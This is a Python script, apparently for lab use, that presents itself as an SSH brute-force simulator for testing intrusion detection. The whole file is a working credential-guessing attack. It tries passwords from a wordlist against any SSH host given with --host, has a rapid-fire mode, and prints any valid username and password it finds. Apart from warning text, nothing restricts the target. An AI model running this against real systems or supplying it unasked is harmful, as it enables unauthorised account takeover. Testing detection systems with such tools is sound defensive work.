#!/usr/bin/env python3
"""
Brute-Force SSH Attack Simulator
Purpose: Test IDS/IPS detection of SSH brute-force attacks
Usage: python3 bruteforce_ssh_attack.py --host <target_ip> --port 22 --user admin --wordlist passwords.txt

This script safely simulates brute-force SSH attacks in a controlled lab environment.
DO NOT USE ON SYSTEMS YOU DON'T OWN!
"""

import paramiko
import sys
import argparse
import time
from datetime import datetime

class SSHBruteForceSimulator:
    def __init__(self, host, port=22, username='admin', timeout=5):
        self.host = host
        self.port = port
        self.username = username
        self.timeout = timeout
        self.successful_logins = []
        self.failed_attempts = 0
        self.total_attempts = 0
        
    def attempt_login(self, password):
        """Try to login with given password"""
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            print(f"[{datetime.now().strftime('%H:%M:%S')}] Attempting: {self.username}:{password}")
            
            client.connect(
                self.host,
                port=self.port,
                username=self.username,
                password=password,
                timeout=self.timeout,
                allow_agent=False,
                look_for_keys=False,
                auth_timeout=self.timeout
            )
            
            print(f"[SUCCESS] Found credentials: {self.username}:{password}")
            self.successful_logins.append((self.username, password))
            client.close()
            return True
            
        except paramiko.AuthenticationException:
            print(f"[FAILED] Invalid credentials: {self.username}:{password}")
            self.failed_attempts += 1
            return False
            
        except paramiko.SSHException as e:
            print(f"[ERROR] SSH error: {str(e)}")
            return False
            
        except Exception as e:
            print(f"[ERROR] Connection error: {str(e)}")
            return False
        
        finally:
            self.total_attempts += 1
    
    def run_wordlist_attack(self, wordlist_file, delay_between_attempts=1):
        """Run brute-force attack using wordlist"""
        try:
            with open(wordlist_file, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"Error: Wordlist file '{wordlist_file}' not found!")
            sys.exit(1)
        
        print(f"\n[*] Starting SSH Brute-Force Attack")
        print(f"[*] Target: {self.host}:{self.port}")
        print(f"[*] Username: {self.username}")
        print(f"[*] Passwords to try: {len(passwords)}")
        print(f"[*] Delay between attempts: {delay_between_attempts} second(s)")
        print(f"[*] Start time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        
        start_time = time.time()
        
        for i, password in enumerate(passwords, 1):
            if self.attempt_login(password):
                elapsed = time.time() - start_time
                print(f"\n[+] Attack successful after {i} attempts in {elapsed:.2f} seconds!")
                break
            
            # Delay between attempts (to be detected by IDS)
            time.sleep(delay_between_attempts)
            
            # Print progress
            if i % 10 == 0:
                print(f"[*] Progress: {i}/{len(passwords)} attempts")
        
        elapsed = time.time() - start_time
        self.print_summary(elapsed)
    
    def rapid_fire_attack(self, password_list, attempts_per_second=5):
        """Rapid fire attack without delay (easier to detect)"""
        print(f"\n[*] Starting Rapid-Fire SSH Brute-Force Attack")
        print(f"[*] Target: {self.host}:{self.port}")
        print(f"[*] Username: {self.username}")
        print(f"[*] Attempts per second: {attempts_per_second}")
        print(f"[*] Start time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        
        start_time = time.time()
        delay = 1.0 / attempts_per_second
        
        for i, password in enumerate(password_list, 1):
            if self.attempt_login(password):
                elapsed = time.time() - start_time
                print(f"\n[+] Attack successful after {i} attempts in {elapsed:.2f} seconds!")
                break
            
            time.sleep(delay)
        
        elapsed = time.time() - start_time
        self.print_summary(elapsed)
    
    def print_summary(self, elapsed_time):
        """Print attack summary"""
        print(f"\n{'='*60}")
        print(f"ATTACK SUMMARY")
        print(f"{'='*60}")
        print(f"Total Attempts:       {self.total_attempts}")
        print(f"Failed Attempts:      {self.failed_attempts}")
        print(f"Successful Logins:    {len(self.successful_logins)}")
        print(f"Duration:             {elapsed_time:.2f} seconds")
        print(f"Attack Rate:          {self.total_attempts/elapsed_time:.2f} attempts/second")
        print(f"{'='*60}\n")
        
        if self.successful_logins:
            print("Successful Credentials Found:")
            for user, pwd in self.successful_logins:
                print(f"  - {user}:{pwd}")


def main():
    parser = argparse.ArgumentParser(
        description='SSH Brute-Force Attack Simulator for IDS/IPS Testing',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Standard wordlist attack
  python3 bruteforce_ssh_attack.py --host 192.168.1.100 --user admin --wordlist passwords.txt
  
  # Rapid-fire attack (easier to detect)
  python3 bruteforce_ssh_attack.py --host 192.168.1.100 --user admin --rapid --attempts 10
  
  # Custom delay between attempts
  python3 bruteforce_ssh_attack.py --host 192.168.1.100 --user admin --wordlist passwords.txt --delay 2

WARNING: Only use on systems you own or have explicit permission to test!
        """
    )
    
    parser.add_argument('--host', required=True, help='Target SSH host IP address')
    parser.add_argument('--port', type=int, default=22, help='Target SSH port (default: 22)')
    parser.add_argument('--user', default='admin', help='Username to attack (default: admin)')
    parser.add_argument('--wordlist', help='Password wordlist file')
    parser.add_argument('--delay', type=float, default=1, help='Delay between attempts in seconds (default: 1)')
    parser.add_argument('--rapid', action='store_true', help='Use rapid-fire mode')
    parser.add_argument('--attempts', type=int, default=5, help='Attempts per second in rapid mode (default: 5)')
    parser.add_argument('--timeout', type=int, default=5, help='Connection timeout in seconds (default: 5)')
    
    args = parser.parse_args()
    
    # Validate arguments
    if not args.wordlist and not args.rapid:
        print("Error: Must specify either --wordlist or --rapid")
        parser.print_help()
        sys.exit(1)
    
    # Create simulator
    simulator = SSHBruteForceSimulator(
        host=args.host,
        port=args.port,
        username=args.user,
        timeout=args.timeout
    )
    
    # Run attack
    if args.rapid:
        # Generate simple password list for rapid attack
        passwords = [f"password{i}" for i in range(args.attempts * 10)]
        simulator.rapid_fire_attack(passwords, attempts_per_second=args.attempts)
    else:
        simulator.run_wordlist_attack(args.wordlist, delay_between_attempts=args.delay)


if __name__ == '__main__':
    main()
